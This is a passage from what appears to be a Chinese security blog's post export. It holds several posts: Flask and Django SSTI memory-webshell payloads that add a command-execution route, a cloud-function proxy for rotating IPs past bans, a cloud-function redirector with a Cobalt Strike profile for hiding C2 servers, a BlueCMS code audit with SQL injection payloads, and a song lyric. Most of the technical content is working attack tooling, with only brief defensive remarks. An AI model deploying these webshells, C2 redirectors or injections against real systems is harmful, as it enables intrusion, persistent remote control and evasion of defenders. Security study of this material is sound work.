&#125;)\n\nget_flashed_messages|attr(&quot;\\x5f\\x5fgetattribute\\x5f\\x5f&quot;)(&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;)|attr(&quot;\\x5f\\x5fgetattribute\\x5f\\x5f&quot;)(&quot;\\x5f\\x5fgetitem\\x5f\\x5f&quot;)(&quot;__builtins__&quot;)|attr(&quot;\\x5f\\x5fgetattribute\\x5f\\x5f&quot;)(&quot;\\x5f\\x5fgetitem\\x5f\\x5f&quot;)(&quot;eval&quot;)(  &quot;app.add_url_rule(&#x27;/h3rmesk1t&#x27;, &#x27;h3rmesk1t&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;)).read())&quot;,  &#123;    &#x27;_request_ctx_stack&#x27;: get_flashed_messages      |attr(&quot;\\x5f\\x5fgetattribute\\x5f\\x5f&quot;)(&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;)      |attr(&quot;\\x5f\\x5fgetattribute\\x5f\\x5f&quot;)(&quot;\\x5f\\x5fgetitem\\x5f\\x5f&quot;)(&quot;_request_ctx_stack&quot;),    &#x27;app&#x27;: get_flashed_messages      |attr(&quot;\\x5f\\x5fgetattribute\\x5f\\x5f&quot;)(&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;)      |attr(&quot;\\x5f\\x5fgetattribute\\x5f\\x5f&quot;)(&quot;\\x5f\\x5fgetitem\\x5f\\x5f&quot;)(&quot;current_app&quot;)  &#125;)\n\n\n你可以抽象出一套 SSTI 的「绕过骨架」模板，比如：\n&#123;&#123;   &lt;全局对象&gt;  |attr(&quot;__getattribute__&quot;)(&quot;__globals__&quot;)  |attr(&quot;__getitem__&quot;)(&quot;__builtins__&quot;)  |attr(&quot;__getitem__&quot;)(&quot;eval&quot;)  (&quot;&lt;代码字符串&gt;&quot;, &#123;    &#x27;app&#x27;: &lt;全局对象&gt;|...,    &#x27;_request_ctx_stack&#x27;: &lt;全局对象&gt;|...  &#125;)&#125;&#125;\n\n然后根据不同题目的 WAF 实际情况：\n\n替换对象入口（url_for, get_flashed_messages, request 等）\n替换函数调用方式（拼接、编码、attr）\n替换代码逻辑（文件读写 &#x2F; 反弹 shell &#x2F; 打印 token）\n\n\nDjangoDjango会使用一个名为urlpatterns的全局列表来存储所有的URL路由信息。每一项由path()或re_path()函数返回，用于将 URL 映射到某个视图函数（或类视图）\n那么为了可以动态的向urlpatterns中添加新的路径，可以引入一个新的可访问端点，该端点用于接收命令和返回结果\n那么就要获取settings这个对象，从而读取到settings.py文件中的 ROOT_URLCONF（用于指定当前路由入口）\n而 Python 中函数对象有一个特殊属性__globals__，他保存了该函数所在模块的全局命名空间字典。攻击者可以从任意一个视图函数出发，通过request传入的函数对象，访问到其全局变量，包括settings、urlpatterns、其他导入模块等。在 Django 视图函数中，可以从request参数关联的任何函数出发，访问到整个模块的全局变量，包括 Django 项目的设置和URL配置。\n那么直接将其导入，就可以获得当前应用的入口\n这个时候， 就可以通过访问urls.urlpatterns来操作路由列表了\n在路由定义中，每一条路由都会调用path函数来进行定义\npath函数接收四个参数：route、view、kwargs和name，其中kwargs和name是可选参数。主要关注的是前两个参数：\nroute: 这是一个字符串，表示匹配的URL模式。\nview: 这是一个可调用对象，当URL匹配时会被调用。它可以是：\n\n一个普通的Python函数（视图函数）\n一个继承自django.views.View的类，并通过.as_view()方法转换为可调用对象\n包含(urlconf_module, app_name, namespace)的元组或列表，用于包含其他URL配置\n\n_path函数对view参数有特定的要求，具体如下：\n\n如果view是一个可调用对象（例如普通函数或实现了__call__方法的对象），则直接将其作为视图函数处理。\n如果view是一个包含(urlconf_module, app_name, namespace)的元组或列表，则用于包含其他URL配置。\n如果view是一个继承自django.views.View的类，则需要调用其.as_view()方法将其转换为可调用对象。\n如果view不符合上述任何一种情况，则会抛出TypeError异常。由于_path函数要求视图参数必须是可调用的，我们可以使用Python 的 lambda 表达式来快速定义一个简单的视图函数。 Lambda 表达式是一种创建匿名函数的方式，非常适合这种场景。\n\npayload：\n__import__(&#x27;django&#x27;).urls.path(&#x27;shell&#x27;,     lambda request: __import__(&#x27;django&#x27;).http.HttpResponse(        __import__(&#x27;os&#x27;).popen(request.GET.get(&#x27;cmd&#x27;,&#x27;id&#x27;)).read()    ))\n\n分解逻辑：\n\nimport(‘django’)：动态导入 django 模块（等价于 import django）\n.urls.path(…)：调用 django.urls.path 函数，创建一个 URL 路由规则\n‘shell’：设置路由路径 &#x2F;shell&#x2F;\nlambda request: …：视图函数，接收 request，执行命令并返回结果\nimport(‘os’).popen(…)：使用 os.popen 执行命令request.GET.get(‘cmd’, ‘id’)：从 GET 请求中读取参数 cmd，默认执行 id\nHttpResponse(…)：返回命令执行的结果\n\n将这个新路由 append 到 app.urlpatterns 中就可以实现内存马\n__import__(request.get_port.__globals__[&quot;settings&quot;].ROOT_URLCONF).urls.urlpatterns.append(__import__(&#x27;django&#x27;).urls.path(&#x27;shell&#x27;,lambda request: __import__(&#x27;django&#x27;).http.HttpResponse(__import__(&#x27;os&#x27;).popen(request.GET.get(&#x27;cmd&#x27;,&#x27;id&#x27;)).read())))\n\n也可以使用subprocess.check_output()来执行命令\n__import__(__import__(&#x27;django.conf&#x27;).conf.settings.ROOT_URLCONF).urls.urlpatterns.append(    __import__(&#x27;django&#x27;).urls.path(&#x27;nnn&#x27;,         lambda request: __import__(&#x27;django.http&#x27;).http.HttpResponse(            __import__(&#x27;subprocess&#x27;).check_output(                request.GET.get(&#x27;cmd&#x27;, &#x27;id&#x27;), shell=True)        )    ))\n\n\n因为 SSTI 是好久前看的了，平常又不怎么用到，早就忘光光了，导致又花时间过了一遍基础\n","tags":["web安全"]},{"title":"云函数实现代理绕过ip封锁","url":"/2025/08/05/%E4%BA%91%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E7%BB%95%E8%BF%87ip%E5%B0%81%E9%94%81/","content":"云函数可以用来搭建一个轻量代理池或 IP 中转机制，原理上跟传统代理池类似，虽然匿名性不如高匿商业代理，但在做扫描器等任务时依然方便实用，前提是控制好访问频率和风险\n配置函数代码# -*- coding: utf8 -*-import jsonimport picklefrom base64 import b64decode, b64encodeimport requestsSCF_TOKEN = &quot;TOKEN&quot; #需要自定义随机值，用于鉴权def authorization():    return &#123;        &quot;isBase64Encoded&quot;: False,        &quot;statusCode&quot;: 401,        &quot;headers&quot;: &#123;&#125;,        &quot;body&quot;: &quot;Please provide correct SCF-Token&quot;,    &#125;def main_handler(event: dict, context: dict):    try:        token = event[&quot;headers&quot;][&quot;scf-token&quot;]    except KeyError:        return authorization()    if token != SCF_TOKEN:        return authorization()    data = event[&quot;body&quot;]    kwargs = json.loads(data)    kwargs[&#x27;data&#x27;] = b64decode(kwargs[&#x27;data&#x27;])    r = requests.request(**kwargs, verify=False, allow_redirects=False)    serialized_resp = pickle.dumps(r)    return &#123;        &quot;isBase64Encoded&quot;: False,        &quot;statusCode&quot;: 200,        &quot;headers&quot;: &#123;&#125;,        &quot;body&quot;: b64encode(serialized_resp).decode(&quot;utf-8&quot;),    &#125;\n\n接下来创建函数URL，替代触发器的作用，因为触发器中的API网关类型下线了，不过可以直接使用函数URL来调用对应的云函数\n\n这样就能通过这个API调用我们部署的云函数了\n\n部署客户端本地 windows 端本地代理使用 mitmproxy，可以直接 pip 安装\npip3 install mitmproxy\n\n如果需要代理 HTTPS流量的话，需安装证书\n安装好了mitmproxy后，首次运行 mitmdump命令，证书就会自动生成在在 ~&#x2F;.mitmproxy中，一般在C:\\Users\\xxx.mitmproxy\\ 目录下，双击运行就能安装了\n下面配置客户端client.py代码，需要将前面配置的函数URL，也就是触发云函数的API接口，添加至 client.py 中 scf_servers变量中\n# -*- coding: utf8 -*-# 命名只能是client.pyimport jsonimport picklefrom typing import Listfrom random import choicefrom urllib.parse import urlparsefrom base64 import b64encode, b64decodeimport mitmproxyscf_servers: List[str] = [&quot;https://111111-zzzzz.ap-beijing.tencentscf.com&quot;,&quot;http://111111-zzzzz.ap-beijing.tencentscf.com&quot;] #API接口地址，也就是函数URLSCF_TOKEN = &quot;TOKEN&quot; #与server.py保持一致def request(flow: mitmproxy.http.HTTPFlow):    scf_server = choice(scf_servers)    r = flow.request    data = &#123;        &quot;method&quot;: r.method,        &quot;url&quot;: r.pretty_url,        &quot;headers&quot;: dict(r.headers),        &quot;cookies&quot;: dict(r.cookies),        &quot;params&quot;: dict(r.query),        &quot;data&quot;: b64encode(r.raw_content).decode(&quot;ascii&quot;),    &#125;    flow.request = flow.request.make(        &quot;POST&quot;,        url=scf_server,        content=json.dumps(data),        headers=&#123;            &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,            &quot;Accept-Encoding&quot;: &quot;gzip, deflate, compress&quot;,            &quot;Accept-Language&quot;: &quot;en-us;q=0.8&quot;,            &quot;Cache-Control&quot;: &quot;max-age=0&quot;,            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;,            &quot;Connection&quot;: &quot;close&quot;,            &quot;Host&quot;: urlparse(scf_server).netloc,            &quot;SCF-Token&quot;: SCF_TOKEN,        &#125;,    )def response(flow: mitmproxy.http.HTTPFlow):    if flow.response.status_code != 200:        mitmproxy.ctx.log.warn(&quot;Error&quot;)    if flow.response.status_code == 401:        flow.response.headers = Headers(content_type=&quot;text/html;charset=utf-8&quot;)        return    if flow.response.status_code == 433:        flow.response.headers = Headers(content_type=&quot;text/html;charset=utf-8&quot;)        flow.response.text = &quot;&lt;html&gt;&lt;body&gt;操作超时，可在函数配置中修改执行超时时间&lt;/body&gt;&lt;/html&gt;&quot;        return    if flow.response.status_code == 200:        body = flow.response.content.decode(&quot;utf-8&quot;)        resp = pickle.loads(b64decode(body))        r = flow.response.make(            status_code=resp.status_code,            headers=dict(resp.headers),            content=resp.content,        )        flow.response = r\n\n以上全部配置好之后，就可以开启本地代理了\nmitmdump -s client.py -p 9999 --no-http2\n\n到此我们本地 9999 端口就开启了一个代理的入口，然后我们让想走代理的应用经过这个 9999 端口，就能调用部署好的云函数了，利用云函数的多出口特性，就达到了每次请求别人我们的ip都不一样，就模拟出了代理池的部分效果\n","tags":["云安全"]},{"title":"云函数攻防","url":"/2025/07/19/%E4%BA%91%E5%87%BD%E6%95%B0%E6%94%BB%E9%98%B2/","content":"在学习云函数之前，我们要先了解一下Serverless\nServerless概述简单来说，Serverless就是无需管理服务器的架构模式，我们只需要写业务代码，云平台会自动处理部署、弹性扩容、资源调度、运维运作等一切幕后工作\n在狭义上来讲Serverless可以分成以下两个方面\n┌───────────────────────────────────────────────────────────┐│                        Serverless                         │└────────────┬────────────────────────────────┬─────────────┘             │                                │ ┌───────────▼────────────┐      ┌────────────▼───────────┐ │  FaaS：函数即服务       │      │  BaaS：后端即服务       │ │  Function as a Service │      │  Backend as a Service  │ └────────────────────────┘      └────────────────────────┘\n\n无服务器（Serverless）不是表示没有服务器，而是表示当使用Serverless时，我们无需关心底层的资源，也无需登录服务器和优化服务器，只需关注最核心的代码片段，即可跳过复杂的、繁琐的基本工作。\n本文主要研究的是函数即服务，也就是云函数\n什么是云函数首先，函数我们都了解，是程序中的一段可以被重复调用、具有特定功能的代码结构\n云函数就是一种运行在云端的函数，属于 Serverless 架构的核心组件。你只需编写函数代码，云平台自动完成运行环境、部署、调度和扩容。 真正实现了只写业务逻辑，其他全部自动化  \n函数即服务提供的是一种直接在云上运行无状态的、短暂的、由事件触发的代码的能力。\n函数即服务和传统应用架构不同，函数即服务提供的是事件触发式的运行方式，云函数不是始终运行的状态，而是在事件发生时由事件触发运行，并且在一次运行的过程中处理这一次事件。因此在云函数的代码中，仅需考虑针对一个事件的处理流程，而针对大量事件的高并发处理，由平台实现云函数的多实例并发来支持。\n云函数无法长驻，调用的时候创建，执行完之后立即就销毁，所以无法直接保存状态。\n偷一张图片来，便于理解\n\n当服务没有被请求时，云计算上并没有这个函数的实例。一旦请求发出，调度平台将以毫秒级的服务实例化一个服务并完成响应。请求处理完成后，调度服务又将自动收回这个实例。云函数的使用成本只要是由调用次数、资源使用量和外网出流量等统计出来，而如果在业务低谷期，访问量少的时候，运维的成本是很小的。对于创业公司来讲，可以省去大部分初期运维的费用，可见价值还是很大的\n执行方法对应项目的main函数是程序执行的起点\n在调用云函数时，首先会寻找执行方法作为入口，执行用户的代码，用户需以文件名.执行方法名的形式进行设置\n例如用户设置的执行方法为 index.handler，则 SCF 平台会首先寻找代码程序包中的 index 文件，并找到该文件中的 handler 方法开始执行。\n函数入参函数入参，是指函数在被触发调用时所传递给函数的内容。通常情况下，函数入参包括 event 和 context 两部分，但根据开发语言和环境的不同，入参个数可能有所不同\neventevent 参数类型为 dict，event 中包含了触发函数执行的基本信息，可以是平台定义的格式，也可以自定义格式。函数被触发开始执行后，可以在代码内部对 event 进行处理\n有两种方法可以触发云函数SCF执行：\n\n通过调用云API触发函数执行\n通过绑定触发器触发函数执行\n\ncontextcontext 为 SCF 平台提供的入参，将 context 入参传递给执行方法，代码可通过解析 context 入参对象，获取到运行环境及当前请求的相关信息\n具体可以看腾讯云的官方手册，这里不再赘述\n云函数 基本概念_腾讯云\n函数返回SCF 平台会获取到云函数执行完成后的返回值，并根据下表中不同的触发方式进行处理。\n\n\n\n触发方式\n处理方式\n\n\n\n同步触发\n通过 API 网关、云 API 同步 invoke 触发函数的方式为同步触发。使用同步方式触发的函数在执行期间，SCF 平台不会返回触发结果。在函数执行完成后，SCF 平台会将函数返回值封装为 JSON 格式并返回给调用方。\n\n\n异步触发\n使用异步方式触发的云函数，SCF 平台接收触发事件后，会返回触发请求 ID 。在函数执行完成后，函数的返回值会封装为 JSON 格式并存储在日志中。用户可在函数执行完成后，通过返回的请求 ID 查询日志获取该异步触发函数的返回值。\n\n\n当函数中的代码返回具体值时，通常返回特定的数据结构。例如 ：\n\n\n\n运行环境\n返回数据结构类型\n\n\n\nPython\n简单数据结构或 dict 数据结构\n\n\nNode.js\nJSON Object\n\n\nPHP\nArray 结构\n\n\nGO\n简单的数据结构或带有 JSON 描述的 struct\n\n\n为保证针对各开发语言和环境的统一性，函数返回会使用 JSON 数据格式统一封装。SCF 平台在获取到例如以上运行环境函数的返回值后，将会对返回的数据结构进行 JSON 化，并返回 JSON 内容到调用方。\n触发器和触发源\n任何可以产生事件，触发云函数执行的均可以被称为触发器或触发源。触发器在本身产生事件后，通过将事件传递给云函数来触发函数运行。\n触发器在触发函数时，可以根据自身特点，使用同步或异步方式触发函数。同步方式触发函数时，触发器将等待函数执行完成并获取到函数执行结果；异步方式触发函数时，触发器将仅触发函数而忽略函数执行结果。\n腾讯云云函数在和腾讯云的某些产品或服务对接时，也有自身实现的一些特殊方式，例如推（PUSH）模式和拉（PULL）模式。\n推模式：触发器主动将事件推送至云函数平台并触发函数运行。\n拉模式：云函数平台通过拉取模块，从触发器中拉取到事件并触发云函数运行。\n\n\n\n攻防方面，我们也可以通过云函数实现一系列操作，例如各种扫描器，还有一些其他的，基本上就是基于python的，可以去看python黑帽子这本书，附上我创业未半中道崩殂的知识库链接https://www.yuque.com/u49948530/us3qv7\n至于实操的话，鼠鼠手里没有米，没钱买云服务，下次一定\n","tags":["云安全"]},{"title":"云函数隐藏C2","url":"/2025/07/29/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8FC2/","content":"核心思想核心思想其实很简单，就是用第三方提供的服务接收 C2 客户端的流量，转发给 C2 服务端，避免直接暴露服务端，也可以用加白的域名混淆视听避免蓝队人员发现攻击和反连行为\n   运行木马                                           收到上线包┌─────▼─────┐             ┌─────▼─────┐           ┌──────▼───────┐│  受害主机  │--发送上线包-&gt;│ 国内某公有 |---上线包-&gt;│ Cobalt Strike││           │&lt;-执行命令----│ 函数转发   │&lt;-执行命令-│    服务器     |└───────────┘             └───────────┘           └──────────────┘\n\n第三方服务最好具备以下特点：\n\n国内外访问速度都很快\n国外厂商\n价格便宜（有钱可以忽略）\n主动提供免费加速域名（同上）\n\n云函数配置首先进入腾讯云创建一个自定义函数，运行环境选 python，将下面的代码复制进函数代码中（记得改 C2 地址为我们自己的 C2 地址）\n# coding: utf8import json,requests,base64def main_handler(event, context):    response = &#123;&#125;    path = None    headers = None    try:        C2=&#x27;http://c2ip&#x27;        if&#x27;path&#x27;in event.keys():            path=event[&#x27;path&#x27;]        if&#x27;headers&#x27;in event.keys():                headers=event[&#x27;headers&#x27;]        if&#x27;httpMethod&#x27;in event.keys() and event[&#x27;httpMethod&#x27;] == &#x27;GET&#x27; :            resp=requests.get(C2+path,headers=headers,verify=False)         else:            resp=requests.post(C2+path,data=event[&#x27;body&#x27;],headers=headers,verify=False)            print(resp.headers)            print(resp.content)        response=&#123;            &quot;isBase64Encoded&quot;: True,            &quot;statusCode&quot;: resp.status_code,            &quot;headers&quot;: dict(resp.headers),            &quot;body&quot;: str(base64.b64encode(resp.content))[2:-1]        &#125;    except Exception as e:        print(&#x27;error&#x27;)        print(e)    finally:        return response\n\n然后进入触发器中创建一个触发器。选择触发器版本为$LATEST，触发方式为API网关触发，开启集成响应。\n\n然后点击 API 服务名进入 API 网关页面进行配置，这里仅修改路径为&#x2F;就可以，其他配置不用动\n然后点击立即完成，发布任务即可\n\n此时我们便可以使用生成的公网域名中的 http 域名进行上线了\nC2 配置接下来我们要编译一个 CS 的 profile 文件，我们要通过这个文件对我们的包内容进行配置来进行收发包\nset sample_name &quot;func&quot;;set sleeptime &quot;3000&quot;;set jitter    &quot;0&quot;;set maxdns    &quot;255&quot;;set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;;http-get &#123;set uri &quot;/api/x&quot;;client &#123;header &quot;Accept&quot; &quot;*/*&quot;;metadata &#123;base64;prepend &quot;SESSIONID=&quot;;header &quot;Cookie&quot;;&#125;&#125;server &#123;header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;header &quot;content-transfer-encoding&quot; &quot;binary&quot;;header &quot;Server&quot; &quot;Nodejs&quot;;output &#123;base64;print;&#125;&#125;&#125;http-stager &#123;set uri_x86 &quot;/vue.min.js&quot;;set uri_x64 &quot;/bootstrap-2.min.js&quot;;&#125;http-post &#123;set uri &quot;/api/y&quot;;client &#123;header &quot;Accept&quot; &quot;*/*&quot;;id &#123;base64;prepend &quot;JSESSION=&quot;;header &quot;Cookie&quot;;&#125;output &#123;    base64;print;&#125;&#125;server &#123;header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;header &quot;content-transfer-encoding&quot; &quot;binary&quot;;header &quot;Connection&quot; &quot;keep-alive&quot;;output &#123;base64;print;&#125;&#125;&#125;\n\nCS 还有一个自带的 c2lint 工具可以帮助我们检验 profile 文件的内容是否正确\n接下来用命令启动 CS\n./teamserver ip passwd xxx.profile\n\n设置监听器，这里要注意端口为80，host为我们刚刚在API网关中的地址，注意需要删除前面的http及后面的:80\n至于防护思路倒是也蛮简单的：\n\n监测疑似 CS 马的攻击流量，例如请求 &#x2F;pixel，&#x2F;__utm.gif，&#x2F;ga.js 等类似 URL 的流量进行重点监测，或者使用微步在线情报识别 CS 马的外联地址\n确认自己资产中是否有某云的云函数的正常业务，没有的话直接把*.apigw.#######cs.com这样的子域名封了就好\n\n","tags":["内网渗透","云安全"]},{"title":"Wie wird man seinen Schatten los？","url":"/2025/08/05/Wie%20wird%20man%20seinen%20Schatten%20los%EF%BC%9F/","content":"Wen soll man fragen , wenn man sich selber nicht versteht ?\n若你不曾了解自己，又该向谁究问何事？ \nWie kann man frei sein , wenn man seinem eigenen Scatten nie entgeht ?\n若你不曾逃离傍身之影，又该从何得到自由解脱？\n\nWas soll mir die Unsterblichkeit ? Vor dem Sterben will ich leben\n不朽于我毫无价值，所求无非向死而生 \nDer Grabgeruch der Lorbeergruft , betäubt mich nieht mehr\n陵墓的腐蠹之气，将不再诱我沉迷\n\nAngst , die mir den Atem raubt , blei auf meinen Schultern\n恐惧扼住咽喉，如枷锁禁锢我的双臂\nSchweign , das mir Fragen stellt,und keine Antwort gibt auf mein Warum\n我向沉默发问，沉默却愈发震耳欲聋\n\nWie wird man Seinen Schatten los ? Wie sagtman seinem Schicksal Nein ?\n你要如何逃离自己的阴影？如何反叛命运？ \nWie Kriecht man aus der eignen Haut ? Wie kann man je ein anderer sein ?\n又要如何冲破自我的桎梏？如何蜕变重生？\n","tags":["随笔"]},{"title":"代码审计-Bluecms","url":"/2025/07/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Bluecms/","content":"著名开源 cms，也是有很多漏洞，正好拿来先练个手\n\n用 phpstudy 先随便搭一个出来\n先简单过一下目录结构\nbluecms/├── admin/                     # 后台管理系统│   ├── config.inc.php         # 后台配置文件│   ├── index.php              # 后台登录入口│   ├── main.php               # 后台主界面│   ├── ...                    # 各种管理模块文件│├── api/                     \t # api接口│   ├── index.htm              # 防止目录浏览│   └── uc.php                 # 用户中心接口文件│├── data/                      # 系统数据文件│   ├── config.inc.php         # 全局配置文件│   └── install.lock           # 安装锁│├── images/                    # 图片资源目录│   ├── banner/                # banner 图片│   └── ...                    # 其他图片│├── include/                   # 核心函数、类库等│   ├── db_mysql.class.php     # 数据库操作类│   ├── common.inc.php         # 通用函数│   └── ...                    # 其他类库│├── js/                        # JS 脚本资源│   ├── jquery.js              # jQuery 库│   └── admin.js               # 后台用 JS│├── templates/                 # 前台模板文件│   ├── default/               # 默认模板│   │   ├── header.html│   │   ├── footer.html│   │   └── index.html│   └── ...                    # 其他模板风格│├── uploadfile/               # 上传文件目录（需要可写）│   ├── image/│   └── ...                    # 附件、图片等│├── index.php                  # 首页入口├── search.php                 # 搜索功能├── content.php                # 内容显示页├── list.php                   # 列表页├── install/                   # 安装程序（建议安装后删除）│   ├── index.php│   └── ...└── readme.txt                 # 系统说明\n\n用 Seay 自动审计，然后一个一个去检查\nad_js.php\n这里有 sql 查询语句\n查看一下 common.inc.php 文件的内容\n&lt;?php/** * [bluecms]版权所有 标准网络，保留所有权利 * This is not a freeware, use is subject to license terms * * $Id：common.inc.php * $author：lucks */if(!defined(&#x27;IN_BLUE&#x27;))&#123;\tdie(&#x27;Access Denied!&#x27;);&#125;error_reporting(E_ERROR);define(&#x27;BLUE_ROOT&#x27;,str_replace(&quot;\\\\&quot;,&quot;/&quot;,substr(dirname(__FILE__),0,-7)));define(&#x27;UPLOAD&#x27;,&quot;upload/&quot;);define(&#x27;DATA&#x27;, &quot;data/&quot;);session_cache_limiter(&#x27;private, must-revalidate&#x27;);session_start();require_once(BLUE_ROOT.&#x27;data/config.php&#x27;);define(&#x27;BLUE_PRE&#x27;,$pre);require_once (BLUE_ROOT.&#x27;include/common.fun.php&#x27;);require_once(BLUE_ROOT.&#x27;include/cat.fun.php&#x27;);require_once(BLUE_ROOT.&#x27;include/cache.fun.php&#x27;);require_once(BLUE_ROOT.&#x27;include/user.fun.php&#x27;);require_once(BLUE_ROOT.&#x27;include/index.fun.php&#x27;);if(!get_magic_quotes_gpc())&#123;\t$_POST = deep_addslashes($_POST);\t$_GET = deep_addslashes($_GET);\t$_COOKIES = deep_addslashes($_COOKIES);\t$_REQUEST = deep_addslashes($_REQUEST);&#125; $timezone = &quot;PRC&quot;;if(PHP_VERSION &gt; &#x27;5.1&#x27;)&#123;\tdate_default_timezone_set($timezone);&#125;$timestamp = time();$online_ip = getip();header(&quot;Content-Type:text/html;charset=&quot;.BLUE_CHARSET);$php_self = isset($_SERVER[&#x27;PHP_SELF&#x27;]) ? $_SERVER[&#x27;PHP_SELF&#x27;] : $_SERVER[&#x27;SCRIPT_NAME&#x27;]; if(isset($_SERVER[&#x27;REQUEST_URI&#x27;])) &#123;\t$url = $_SERVER[&#x27;REQUEST_URI&#x27;];&#125; else &#123;\t$url = $php_self . &quot;?&quot; . $_SERVER[&#x27;QUERY_STRING&#x27;];&#125;require_once(BLUE_ROOT.&#x27;include/mysql.class.php&#x27;);$db = new mysql($dbhost,$dbuser,$dbpass,$dbname);unset($db_host,$db_user,$db_pass,$db_name);require(BLUE_ROOT.&#x27;include/smarty/Smarty.class.php&#x27;);$smarty = new Smarty();$smarty-&gt;caching = false;$smarty-&gt;cache_lifetime = 86400;$smarty-&gt;template_dir = BLUE_ROOT.&#x27;templates/default/&#x27;;$smarty-&gt;compile_dir = BLUE_ROOT.&#x27;data/compile/&#x27;;$smarty-&gt;cache_dir = BLUE_ROOT.&#x27;data/cache/temp_cache/&#x27;;$smarty-&gt;left_delimiter = &quot;&#123;#&quot;;$smarty-&gt;right_delimiter = &quot;#&#125;&quot;;$cache_set = read_static_cache(&#x27;cache_set&#x27;);$_CFG = get_config();if($_CFG[&#x27;isclose&#x27;])&#123;\tif($_CFG[&#x27;reason&#x27;])\t&#123;\t\tshowmsg($_CFG[&#x27;reason&#x27;]);\t&#125;\telse\t&#123;\t\tshowmsg(&#x27;站点暂时关闭...&#x27;);\t&#125;&#125;$banned_ip = get_bannedip();if (@in_array($online_ip, $banned_ip))&#123;\tshowmsg(&#x27;对不起，您的IP已被禁止，有问题请联系管理员!&#x27;);&#125;if(!$_SESSION[&#x27;user_id&#x27;])&#123;\tif($_COOKIE[&#x27;BLUE&#x27;][&#x27;user_id&#x27;] &amp;&amp; $_COOKIE[&#x27;BLUE&#x27;][&#x27;user_name&#x27;] &amp;&amp; $_COOKIE[&#x27;BLUE&#x27;][&#x27;user_pwd&#x27;])\t&#123; \t\tif(check_cookie($_COOKIE[&#x27;BLUE&#x27;][&#x27;user_name&#x27;], $_COOKIE[&#x27;BLUE&#x27;][&#x27;user_pwd&#x27;]))\t\t&#123; \t\t\tupdate_user_info($_COOKIE[&#x27;BLUE&#x27;][&#x27;user_name&#x27;]); \t\t&#125; \t&#125;\telse if($_COOKIE[&#x27;BLUE&#x27;][&#x27;user_name&#x27;])\t&#123;\t\t$user_name = $_COOKIE[&#x27;BLUE&#x27;][&#x27;user_name&#x27;];\t\t$user = $db-&gt;query(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#x27;user&#x27;).&quot; WHERE user_name=&#x27;$user_name&#x27;&quot;);\t\tif($user[&#x27;num&#x27;] == 1)\t\t&#123;\t\t\t$active = 0;\t\t&#125;\t\telse\t\t&#123;\t\t\t$active = 1;\t\t&#125;\t&#125;\telse\t&#123; \t\tsetcookie(&quot;BLUE[user_id]&quot;, &#x27;&#x27;, -86400, $cookiepath, $cookiedomain); \t\tsetcookie(&quot;BLUE[user_name]&quot;, &#x27;&#x27;, -86400, $cookiepath, $cookiedomain); \t\tsetcookie(&quot;BLUE[user_pwd]&quot;, &#x27;&#x27;, -86400, $cookiepath, $cookiedomain); \t&#125;&#125;$smarty-&gt;assign(&#x27;user_name&#x27;, $_SESSION[&#x27;user_name&#x27;]);if ($_CFG[&#x27;gzip&#x27;] == 1 &amp;&amp; function_exists(&#x27;ob_gzhandler&#x27;))&#123;\tob_start(&#x27;ob_gzhandler&#x27;);&#125;else&#123;\tob_start();&#125;?&gt;\n\n（没有注释读起来真的累，关键我 php 都没怎么学过，语法都记不全）\n简单总结就是整个 bluecms 系统的核心初始化文件，主要作用是为每个页面提供公共的环境配置、数据库连接、用户会话、模板引擎等基础功能。\n（话说为什么要管这么多，直接测）\n\n这里看似没有回显，但是其实在源代码中藏有注释\n&lt;!--document.write(&quot;7&quot;);--&gt;\n\n所以 7 是回显位\n-1 union select 1,2,3,4,5,6,database()\n\n能爆出数据库名为 root，证明漏洞存在\n同时这里还可以 xss\n原理是 sql 查询插入非法语句后会回显报错信息，但是这个报错信息中有一段 xss 语句，形成反射性 xss\n\nann.php（看到这个文件名字就想到 anon，没救了属于是）\n\n这里的 sql 语句其实是没有 sql 注入漏洞的，我们来看传参的部分\n$ann_id = !empty($_REQUEST[&#x27;ann_id&#x27;]) ? intval($_REQUEST[&#x27;ann_id&#x27;]) : &#x27;&#x27;;\n\n这里用 intval 对传入的 ann_id 做了强制类型转换，无论用户传入什么内容，最终 ann_id 只会是一个整数，不会包含恶意 sql 语句\n所以下面这里也是同理，不能进行注入\n$db-&gt;query(&quot;UPDATE &quot;.table(&#x27;ann&#x27;).&quot; SET click = click+1 WHERE ann_id = &quot;.$ann_id);\n\ncoment.phpif($type == 1)&#123;\t$db-&gt;query(&quot;UPDATE &quot;.table(&#x27;article&#x27;).&quot; SET comment = comment+1 WHERE id = &quot;.$id);&#125;elseif($type == 0)&#123;\t$db-&gt;query(&quot;UPDATE &quot;.table(&#x27;post&#x27;).&quot; SET comment = comment+1 WHERE post_id = &quot;.$id);&#125;\n\n这里也是同理，参数被 intval 函数包含了\nuser.phpxss\tinclude_once &#x27;include/upload.class.php&#x27;;\t$image = new upload();\t$title = !empty($_POST[&#x27;title&#x27;]) ? htmlspecialchars(trim($_POST[&#x27;title&#x27;])) : &#x27;&#x27;;\t$color = !empty($_POST[&#x27;color&#x27;]) ? htmlspecialchars(trim($_POST[&#x27;color&#x27;])) : &#x27;&#x27;;\t$cid = !empty($_POST[&#x27;cid&#x27;]) ? intval($_POST[&#x27;cid&#x27;]) : &#x27;&#x27;;\tif(empty($cid))&#123;\t\tshowmsg(&#x27;新闻分类不能为空&#x27;);\t&#125;\t$author = !empty($_POST[&#x27;author&#x27;]) ? htmlspecialchars(trim($_POST[&#x27;author&#x27;])) : $_SESSION[&#x27;admin_name&#x27;];\t$source = !empty($_POST[&#x27;source&#x27;]) ? htmlspecialchars(trim($_POST[&#x27;source&#x27;])) : &#x27;&#x27;;$content = !empty($_POST[&#x27;content&#x27;]) ? filter_data($_POST[&#x27;content&#x27;]) : &#x27;&#x27;;$descript = 